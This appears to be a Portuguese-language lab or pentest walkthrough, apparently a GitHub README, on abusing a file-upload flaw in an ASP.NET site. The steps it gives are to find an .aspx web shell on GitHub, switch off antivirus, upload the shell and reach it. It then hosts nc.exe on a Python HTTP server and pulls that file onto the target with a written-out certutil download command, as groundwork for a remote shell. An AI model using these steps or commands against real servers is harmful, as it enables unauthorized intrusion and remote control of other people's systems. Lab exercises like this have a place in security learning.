# Depois de levantar informações especificas como o lugar ontem tem uma falha para upar arquivos e deletar , o lugar onde essee arquivos ficam armazenados e ainda conseguir acessar ele.

## Resumindo tudo favoravel para subir o shell

## Contexto para subir o shell sabendo a tecnologia do site que é ASP NET eu posso ta procurando um Shell que seja ASPNET.aspx upar no servidor e acessar ele e conseguir injetar comandos 
## 1° - Procurar no google o SHell : github: shell for ASP.aspx 
## 2° - Desligar o antivirus do computador
![image](https://github.com/user-attachments/assets/d7a9b6dd-d1a3-463e-a716-488dfa836c1a)
## 3° - salvar esse shell no arquivo .aspx
![image](https://github.com/user-attachments/assets/bf04650c-c0af-4cfc-81c8-9d19ef13cf80)
## com ele em mãos é so subir no servidor e acessar
## acessando o local onde descobrimos no DIRSEARCH que é o magnam que faz o trabalho do banco de dados
![image](https://github.com/user-attachments/assets/b4f7bf34-f8f4-40a1-b90b-32065c645192)
## upando arquivo
![image](https://github.com/user-attachments/assets/f4923442-491e-49ad-9738-48ca914b4726)
## arquivo UPADO só acessa agora
![image](https://github.com/user-attachments/assets/0afbee35-4be9-4f1b-acad-2c5cac33dce3)
## acessando o arquivo 
![image](https://github.com/user-attachments/assets/634bf72b-4d67-446c-8acc-9bc82da34bbb)
## shell.aspx subiu porem voce ainda nao tem cotrole total para navegar nos diretorios para fazer um enumeração de arquivos
## proximo passo é baixar o nc.exe e colocar em uma pasta no seu propio windons instalar o python criar uma pasta colocar o arquivo nc.exe lá dentro e dai iniciar o servidor python com o nc.exe disponivel para dowload
![image](https://github.com/user-attachments/assets/0b399e9c-440c-48b4-b4c5-8434dad98986)
## coloquei em uma pasta com o nome "Nova Pasta" e inciei o servidor pyhton pelo cmd do meu windons
![image](https://github.com/user-attachments/assets/919c4e88-32e4-4459-adcb-700e80e462e0)
## agora para baixar usando o shell que eu subi vai ser usado o comando:
```txt
  certutil -urlcache -split -f http://192.168.100.168/nc.exe c:\users\public\nc.exe

    o Certutil serve para baixar arquivos em um windons e como esta em um server http só vai ser preciso colocar a url,
    com o endereço de ip do meu computador windons e o arquivo que vai ser baixado que é o nc.exe,
    e dai ele vai salvar no users public que qualqr um tem acesso com o nome de nc.exe
```
